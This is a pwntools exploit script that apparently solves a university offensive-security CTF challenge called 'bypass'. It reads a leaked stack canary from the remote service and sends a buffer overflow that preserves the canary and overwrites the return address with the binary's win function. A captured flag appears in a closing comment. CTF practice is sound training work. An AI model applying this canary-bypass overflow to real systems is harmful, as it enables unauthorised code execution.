from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./bypass"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1281
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b get_input
#     continue
# ''')

e = ELF(CHALLENGE)
s = asm("endbr64 ; push rbp", arch='amd64')
win_addr = e.symbols.win + len(s)

print(p.recvuntil(b": ").decode())
number = int(p.recvline().decode().strip(), 16)
log.info(f"Reveiving the number: {hex(number)}")

print(p.recvuntil(b"> ").decode())
msg = b"B" * 0x18 + p64(number) + b"B" * 0x8 + p64(e.symbols.win + len(s))
p.sendline(msg)
log.info(f"Sending raw bytes: {msg}")
log.info(f"Assigning the number's value as: {hex(number)}")
log.info(f"Overwriting the return address in the stack to: {hex(win_addr)}")

p.interactive()

# flag{n0_n33d_t0_gu3ss_wh3n_y0u_c4n_L34K_0f_th3_CaNarY_v4lu3!_24de86686a35a38d}
